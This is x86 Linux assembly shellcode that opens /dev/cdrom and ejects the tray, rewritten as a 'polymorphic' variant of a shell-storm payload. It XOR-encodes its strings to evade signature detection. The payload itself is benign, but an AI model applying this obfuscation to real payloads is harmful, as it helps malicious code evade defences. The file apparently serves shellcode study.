; Original: http://shell-storm.org/shellcode/files/shellcode-563.php
; Polymorphic version by: Tristan aka R3OATH
; Website: www.r3oath.com

global _start

section .text
_start:

	; Original
	;mov al, 5
	;cdq
	;push edx
	;push word 0x6d6f
	;push dword 0x7264632f
	;push dword 0x7665642f
	;mov ebx, esp
	;mov cx, 0xfff
	;sub cx, 0x7ff
	;int 0x80
 
	; ioctl(fd, CDROMEJECT, 0);
	;mov ebx, eax
	;mov al, 54
	;mov cx, 0x5309
	;cdq
	;int 0x80

	; Polymorphic
	push edx
	mov esi, 0xdeadbeef
	push 0xdeadd380
	push 0xacc9ddc0
	push 0xa8c8dac0
	mov ebx, esp
	mov cl, 0x3
	add esp, 0x8
	xor [esp], esi
	sub esp, 0x4
	loop $-6
	mov ecx, eax
	mov cx, 0x811
	sub cx, 0x11
	mov al, 0x5
	int 0x80
	; part 2
	mov ebx, eax
	mov al, 0x36
	mov cx, 21257
	int 0x80

	
